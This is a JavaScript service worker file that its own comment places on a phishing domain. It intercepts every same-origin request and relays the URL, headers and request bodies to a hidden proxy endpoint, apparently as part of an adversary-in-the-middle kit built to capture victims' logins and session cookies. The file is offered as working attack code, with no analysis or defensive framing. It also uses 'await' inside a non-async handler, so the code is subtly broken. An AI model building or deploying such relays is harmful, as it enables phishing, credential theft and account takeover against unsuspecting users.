// script_Vx9Z6XN5uC3k.js – Service Worker that intercepts all fetch requests

const PROXY_ENDPOINT = '/lNv1pC9AWPUY4gbidyBO';

self.addEventListener('install', (event) => {
    self.skipWaiting();
    event.waitUntil(Promise.resolve());
});

self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());
});

self.addEventListener('fetch', (event) => {
    const request = event.request;
    const url = new URL(request.url);

    // Only intercept same-origin requests (relative to the phishing domain)
    if (url.origin !== self.location.origin) return;

    // Don't intercept the service worker itself, the proxy endpoint, or the mutation endpoint
    if (url.pathname === '/service_worker_Mz8XO2ny1Pg5.js' ||
        url.pathname === PROXY_ENDPOINT ||
        url.pathname === '/Mutation_o5y3f4O7jMGW' ||
        url.pathname === '/JSCookie_6X7dRqLg90mH' ||
        url.pathname === '/@') {
        return;
    }

    // Build the proxy request
    const proxyRequest = new Request(PROXY_ENDPOINT, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
        },
        body: JSON.stringify({
            url: request.url,
            method: request.method,
            headers: Object.fromEntries(request.headers.entries()),
            body: request.method !== 'GET' && request.method !== 'HEAD' ? await request.text() : undefined,
            mode: request.mode === 'navigate' ? 'navigate' : 'cors',
            referrer: request.referrer
        })
    });

    event.respondWith(fetch(proxyRequest).then(response => {
        // If the proxy returns a redirect, follow it
        if (response.status >= 300 && response.status < 400 && response.headers.get('location')) {
            return fetch(response.headers.get('location'));
        }
        return response;
    }));
});
